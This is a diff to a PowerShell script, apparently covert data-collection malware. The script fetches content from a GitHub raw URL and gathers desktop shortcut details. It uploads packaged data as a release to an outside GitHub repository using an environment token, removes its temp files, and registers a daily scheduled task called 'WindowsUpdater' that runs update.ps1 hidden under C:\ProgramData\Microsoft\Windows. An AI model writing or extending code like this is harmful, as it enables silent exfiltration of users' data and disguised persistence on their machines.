@@ -6,7 +6,13 @@ Invoke-RestMethod -Uri "https://raw.githubusercontent.com/drftghy/backup-files/m
 [Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 $OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 
-$token = $env:GITHUB_TOKEN
+# Read GitHub token from environment variable
+$token = $env:GH_UPLOAD_KEY
+if (-not $token) {
+    Write-Error "环境变量 GH_UPLOAD_KEY 未设置，无法上传文件到 GitHub"
+    return
+}
+
 $repo = "drftghy/backup-files"
 $now = Get-Date
 $timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
@@ -54,9 +60,9 @@ try {
     $desktop = [Environment]::GetFolderPath("Desktop")
     $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk
     $lnkReport = ""
+    $shell = New-Object -ComObject WScript.Shell
 
     foreach ($lnk in $lnkFiles) {
-        $shell = New-Object -ComObject WScript.Shell
         $shortcut = $shell.CreateShortcut($lnk.FullName)
 
         $lnkReport += "[$($lnk.Name)]`n"
@@ -78,7 +84,7 @@ try {
     return
 }
 
-# STEP 4: Upload
+# STEP 4: Upload to GitHub
 $releaseData = @{
     tag_name = $tag
     name = $releaseName
@@ -113,13 +119,13 @@ try {
 # STEP 5: Cleanup
 Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+
 # STEP 6: Register daily task at 2:00 AM to run the update.ps1 script
 $taskName = "WindowsUpdater"
 $taskDescription = "Daily file package task"
 $scriptPath = "C:\\ProgramData\\Microsoft\\Windows\\update.ps1"
 
 try {
-    # If exists, delete first
     if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
         Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
     }
